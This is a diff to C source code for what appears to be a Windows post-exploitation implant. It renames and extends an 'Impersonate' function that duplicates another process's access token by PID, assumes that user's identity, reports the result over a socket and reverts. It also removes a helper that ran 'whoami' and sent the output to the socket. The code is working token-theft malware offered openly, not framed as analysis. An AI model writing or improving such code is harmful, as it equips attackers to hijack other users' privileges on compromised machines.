@@ -19,19 +19,6 @@
 
 #define ERROR_NOT_ALL_ASSIGNED 1300L
 
-int username(int sockfd){
-
-    /*print Impersonator*/
-    char *print_this = "\r\n\r\n[+] The Current User Is: ";
-    send(sockfd, print_this, sizeof(char) * strlen(print_this), 0);
-    
-    char *whoami = "whoami\r\n";
-    char *name = doexec(whoami, 0);
-    send(sockfd, name, sizeof(char) * strlen(name), 0);
-    free(name);
-    return 0;
-}
-
 char* GetTokenPrivilegesAsString(HANDLE hToken) {
     DWORD dwSize = 0;
     GetTokenInformation(hToken, TokenPrivileges, NULL, 0, &dwSize);
@@ -320,12 +307,15 @@ HANDLE OpenProcessWithToken(DWORD pid) {
     return hDuplicatedToken;
 }
 
-char *impersonate(int pid){
+char *Impersonate(int pid){
     char *first_user = name();
+    STARTUPINFO si;
+    PROCESS_INFORMATION pi;
     HANDLE hToken = OpenProcessWithToken(pid);
     char *open = "[-] Failed to obtain duplicated token.\r\n";
     char *new_user = name();
-    char *impersonateStr = "[+] Impersonated new user.\r\n";
+    char *impersonateStr = "[+] Successfully impersonated new user.\r\n";
+    char *reverting = "[+] Reverting to original user.\r\n";
     if (hToken) {
         open = "[+] Successfully obtained duplicated token.\r\n";
 
@@ -336,15 +326,16 @@ char *impersonate(int pid){
         }
 
         new_user = name();
+
         RevertToSelf();
         CloseHandle(hToken);
     }
 
-    char *result = malloc((strlen(first_user) + strlen(open) + strlen(impersonateStr) + strlen(new_user))*sizeof(char) + 2); 
+    char *result = malloc((strlen(first_user) + strlen(open) + strlen(impersonateStr) + strlen(new_user) + strlen(reverting))*sizeof(char) + 2); 
     strcpy(result, first_user);
     strcat(result, open);
     strcat(result, impersonateStr);
     strcat(result, new_user);
-
+    strcat(result, reverting);
     return result;
 }
